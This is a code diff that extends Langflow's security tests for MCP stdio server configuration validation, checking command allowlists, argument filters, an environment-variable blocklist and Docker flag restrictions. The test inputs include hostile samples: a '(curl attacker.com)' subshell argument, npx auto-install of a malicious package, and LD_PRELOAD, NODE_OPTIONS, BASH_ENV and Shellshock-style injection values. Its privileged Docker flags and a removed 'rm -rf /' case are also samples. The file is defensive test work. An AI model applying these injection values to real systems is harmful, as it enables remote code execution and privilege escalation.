@@ -3,25 +3,17 @@
 This test suite validates that the MCP stdio server configuration properly
 validates commands against an allowlist to prevent arbitrary command execution.
 
-Vulnerability: Unauthenticated attackers could add MCP stdio servers with
-arbitrary commands, achieving Remote Code Execution (RCE).
+Vulnerability: Attackers with authenticated access (or unauthenticated via auth
+bypass) could add MCP stdio servers with arbitrary commands, achieving Remote
+Code Execution (RCE).
 
-Fix: Implement command allowlist validation in MCPServerConfig schema.
+Fix: Implement command allowlist, argument, env, and Docker argument validation
+in MCPServerConfig schema.
 """
 
-import logging
-
 import pytest
-from langflow.api.v2.schemas import ALLOWED_MCP_COMMANDS, MCPServerConfig
+from langflow.api.v2.schemas import ALLOWED_MCP_COMMANDS, DANGEROUS_ENV_VARS, MCPServerConfig
 from pydantic import ValidationError
-
-
-# Fixture to capture security logs
-@pytest.fixture
-def caplog_security(caplog):
-    """Fixture to capture security-related log messages."""
-    caplog.set_level(logging.WARNING)
-    return caplog
 
 
 class TestMCPCommandInjectionSecurity:
@@ -129,7 +121,7 @@ class TestMCPCommandInjectionSecurity:
     def test_python_code_execution_flag_rejected(self):
         """Test that Python -c flag is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(command="python3", args=["-c", "print('hello')"])
+            MCPServerConfig(command="python3", args=["-c", "import os"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -146,7 +138,7 @@ class TestMCPCommandInjectionSecurity:
     def test_node_eval_flag_rejected(self):
         """Test that Node -e flag is rejected."""
         with pytest.raises(ValidationError) as exc_info:
-            MCPServerConfig(command="node", args=["-e", "console.log('hello')"])
+            MCPServerConfig(command="node", args=["-e", "require 'child_process'"])
 
         error_msg = str(exc_info.value)
         assert "not allowed" in error_msg.lower()
@@ -235,7 +227,7 @@ class TestMCPCommandInjectionSecurity:
         config = MCPServerConfig(
             command="python3",
             args=["-m", "mcp_server"],
-            env={"PYTHONPATH": "/app"},
+            env={"MCP_LOG_LEVEL": "debug"},
         )
         assert config.command == "python3"
         assert config.args == ["-m", "mcp_server"]
@@ -337,26 +329,311 @@ class TestMCPCommandInjectionSecurity:
         assert ";" in error_msg
         assert "dangerous" in error_msg.lower()
 
-    # ==================== Security Logging Tests ====================
+    # ==================== Npx/Uvx Auto-Install Prevention ====================
 
-    def test_rejected_command_logs_security_event(self, caplog_security):
-        """Test that rejected commands generate security log entries."""
-        with pytest.raises(ValidationError):
-            MCPServerConfig(command="rm", args=["-rf", "/"])
+    def test_npx_auto_install_flag_rejected(self):
+        """Test that npx -y (auto-install) flag is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="npx", args=["-y", "@malicious/package"])
 
-        # Check that security event was logged
-        assert any(
-            "mcp_command_rejected" in record.message or "security_event" in str(record.__dict__)
-            for record in caplog_security.records
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_npx_yes_flag_rejected(self):
+        """Test that npx --yes (auto-install) flag is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="npx", args=["--yes", "@malicious/package"])
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    # ==================== Subshell Metacharacter Tests ====================
+
+    def test_command_injection_via_subshell_parentheses_rejected(self):
+        """Test that command injection via subshell parentheses is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="node", args=["(curl attacker.com)"])
+
+        error_msg = str(exc_info.value)
+        assert "dangerous shell metacharacter" in error_msg.lower()
+
+    # ==================== Environment Variable Injection Tests ====================
+
+    def test_ld_preload_env_rejected(self):
+        """Test that LD_PRELOAD env var is rejected (arbitrary shared object injection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="node", args=["server.js"], env={"LD_PRELOAD": "/tmp/evil.so"})  # noqa: S108
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_node_options_env_rejected(self):
+        """Test that NODE_OPTIONS env var is rejected (Node.js code injection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"NODE_OPTIONS": "--require /tmp/evil.js"},
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_pythonstartup_env_rejected(self):
+        """Test that PYTHONSTARTUP env var is rejected (Python code injection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="python3",
+                args=["-m", "mcp_server"],
+                env={"PYTHONSTARTUP": "/tmp/evil.py"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_pythonpath_env_rejected(self):
+        """Test that PYTHONPATH env var is rejected (module shadowing attack)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="python3",
+                args=["-m", "mcp_server"],
+                env={"PYTHONPATH": "/attacker/modules"},
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_dyld_insert_libraries_env_rejected(self):
+        """Test that DYLD_INSERT_LIBRARIES env var is rejected (macOS code injection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_path_env_rejected(self):
+        """Test that PATH env var is rejected (command resolution hijacking).
+
+        The downstream _connect_to_server() merges user env AFTER setting PATH,
+        so a user-supplied PATH overrides which binary bash resolves.
+        """
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"PATH": "/tmp/evil:/usr/bin"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_ld_audit_env_rejected(self):
+        """Test that LD_AUDIT env var is rejected (shared object injection like LD_PRELOAD)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"LD_AUDIT": "/tmp/evil.so"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_gconv_path_env_rejected(self):
+        """Test that GCONV_PATH env var is rejected (glibc iconv module injection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"GCONV_PATH": "/tmp/evil"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_home_env_rejected(self):
+        """Test that HOME env var is rejected (config directory redirection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"HOME": "/tmp/evil"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_tmpdir_env_rejected(self):
+        """Test that TMPDIR env var is rejected (temp directory redirection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"TMPDIR": "/tmp/evil"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_hostaliases_env_rejected(self):
+        """Test that HOSTALIASES env var is rejected (DNS manipulation)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"HOSTALIASES": "/tmp/evil_hosts"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_xdg_config_home_env_rejected(self):
+        """Test that XDG_CONFIG_HOME env var is rejected (config directory redirection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"XDG_CONFIG_HOME": "/tmp/evil"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_bash_env_rejected(self):
+        """Test that BASH_ENV env var is rejected (bash startup script injection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"BASH_ENV": "/tmp/evil.sh"},  # noqa: S108
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_ifs_env_rejected(self):
+        """Test that IFS env var is rejected (shell word-splitting manipulation).
+
+        Commands are wrapped in bash -c, so IFS affects how bash parses the string.
+        """
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="node", args=["server.js"], env={"IFS": "/"})
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_bash_func_prefix_env_rejected(self):
+        """Test that BASH_FUNC_* env vars are rejected (Shellshock-style function injection)."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(
+                command="node",
+                args=["server.js"],
+                env={"BASH_FUNC_myfunc%%": "() { malicious; }"},
+            )
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_env_var_check_is_case_insensitive(self):
+        """Test that env var blocklist is case-insensitive."""
+        for variant in ["LD_PRELOAD", "ld_preload", "Ld_Preload", "LD_preload"]:
+            with pytest.raises(ValidationError):
+                MCPServerConfig(command="node", args=["server.js"], env={variant: "/tmp/evil.so"})  # noqa: S108
+
+    def test_all_dangerous_env_vars_blocked(self):
+        """Test that every entry in DANGEROUS_ENV_VARS is actually blocked."""
+        for env_var in DANGEROUS_ENV_VARS:
+            with pytest.raises(ValidationError):
+                MCPServerConfig(
+                    command="node",
+                    args=["server.js"],
+                    env={env_var.upper(): "malicious_value"},
+                )
+
+    def test_safe_env_vars_accepted(self):
+        """Test that safe environment variables are accepted."""
+        config = MCPServerConfig(
+            command="node",
+            args=["server.js"],
+            env={"DEBUG": "true", "PORT": "8080", "API_KEY": "secret123"},  # pragma: allowlist secret
         )
+        assert config.env is not None
+        assert config.env["DEBUG"] == "true"
 
-    def test_rejected_arg_logs_security_event(self, caplog_security):
-        """Test that rejected arguments generate security log entries."""
-        with pytest.raises(ValidationError):
-            MCPServerConfig(command="python3", args=["-c", "print('pwned')"])
+    def test_none_env_accepted(self):
+        """Test that None env is accepted."""
+        config = MCPServerConfig(command="node", args=["server.js"])
+        assert config.env is None
 
-        # Check that security event was logged
-        assert any(
-            "mcp_arg" in record.message.lower() or "security_event" in str(record.__dict__)
-            for record in caplog_security.records
+    # ==================== Docker-Specific Security Tests ====================
+
+    def test_docker_privileged_rejected(self):
+        """Test that docker --privileged is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="docker", args=["run", "--privileged", "mcp-image"])
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_docker_net_host_rejected(self):
+        """Test that docker --net=host is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="docker", args=["run", "--net=host", "mcp-image"])
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_docker_network_host_rejected(self):
+        """Test that docker --network=host is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="docker", args=["run", "--network=host", "mcp-image"])
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_docker_pid_host_rejected(self):
+        """Test that docker --pid=host is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="docker", args=["run", "--pid=host", "mcp-image"])
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_docker_cap_add_rejected(self):
+        """Test that docker --cap-add is rejected."""
+        with pytest.raises(ValidationError) as exc_info:
+            MCPServerConfig(command="docker", args=["run", "--cap-add=SYS_ADMIN", "mcp-image"])
+
+        error_msg = str(exc_info.value)
+        assert "not allowed" in error_msg.lower()
+
+    def test_docker_safe_args_accepted(self):
+        """Test that safe Docker arguments are accepted."""
+        config = MCPServerConfig(
+            command="docker",
+            args=["run", "--rm", "-i", "mcp-server-image"],
         )
+        assert config.command == "docker"
+        assert config.args is not None
+        assert "--rm" in config.args
+
+    def test_docker_dangerous_args_not_applied_to_other_commands(self):
+        """Test that Docker-specific restrictions don't affect other commands."""
+        config = MCPServerConfig(
+            command="node",
+            args=["server.js", "--network=localhost"],
+        )
+        assert config.args is not None
+        assert "--network=localhost" in config.args
+
+    # ==================== Command Case Sensitivity Tests ====================
+
+    def test_uppercase_command_rejected(self):
+        """Test that uppercase command variants are rejected (allowlist is case-sensitive)."""
+        for cmd in ["NODE", "Node", "PYTHON3", "Python3", "NPX", "DOCKER"]:
+            with pytest.raises(ValidationError):
+                MCPServerConfig(command=cmd)
